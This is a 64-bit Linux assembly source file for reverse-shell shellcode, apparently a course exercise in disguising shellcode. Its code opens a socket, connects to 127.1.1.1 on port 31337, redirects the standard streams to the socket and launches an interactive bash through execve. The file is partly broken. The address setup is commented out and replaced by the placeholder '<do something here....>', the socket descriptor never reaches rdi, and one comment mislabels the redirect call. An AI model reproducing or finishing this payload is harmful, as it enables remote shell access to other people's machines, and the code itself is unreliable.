;--------------------------------
; ch09-revshell64.nasm
; by Michael Born (@blu3gl0w13)
; Date: 2019
;-------------------------------

global _start


section .text


_start:

	; int socket(int domain, int type, int protocol)

	;xor rax, rax
	;mov al, 41
	;xor rdi, rdi
	;add dil, 0x2		; domain = AF_INET
	;xor rsi, rsi
	;add rsi, 0x1		; type = SOCK_STREAM
	;xor rdx, rdx
	;syscall

	mov rbx, rax
	xor rax, rbx
	mov r10, rsi
	mov r9, rdi
	xor rsi, r10
	xor rdi, r9
	inc rsi
	inc dil
	inc dil
	mov al, 42
	dec al
	syscall



	; copy sockfd into rdi for later use

	; mov rdi, rax
	
	xor r8, r8
	mov r8, rax



	; AF_INET = 2
	; PORT = 31337
	; IP = 127.1.1.1
	; len = 8

	;xor rax, rax 
	;push rax
	;mov dword [rsp-4], 0x0101017f	;IP = 127.1.1.1
	;mov word [rsp-6], 0x697a	;PORT = 31337		
	;mov dword [rsp-10], eax		;NULL padding
	;mov byte [rsp-8], 0x2		;AF_INET
	;sub rsp, 8
	
	<do something here....>



	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	
	xor rax, rax
	mov al, 42
	mov rsi, rsp
	xor rdx, rdx
	add rdx, 16
	syscall


        ; redirect socket to stdin, stdout, stderr
	; int dup3(int oldfd, int newfd        

	xor rax, rax
	mov al, 33
        xor rsi, rsi
        syscall

	xor rax, rax
        mov al, 33
        inc rsi
        syscall

	xor rax, rax
        mov al, 33
        inc rsi
        syscall



        ; int execve(const char *filename, char *const argv[], char *const envp[])


        xor rax, rax
        push rax
	xor rbx, rbx
        mov rbx, 0x687361622f2f2f2f
	push rbx
	mov rbx, 0x6e69622f2f2f2f2f
        push rbx
        mov rdi, rsp
        push rax
	push word 0x692d
        mov rsi, rsp
	push rax
	push rsi
	push rdi
	mov rsi, rsp	
	xor rdx, rdx
        add rax, 59
        syscall
 
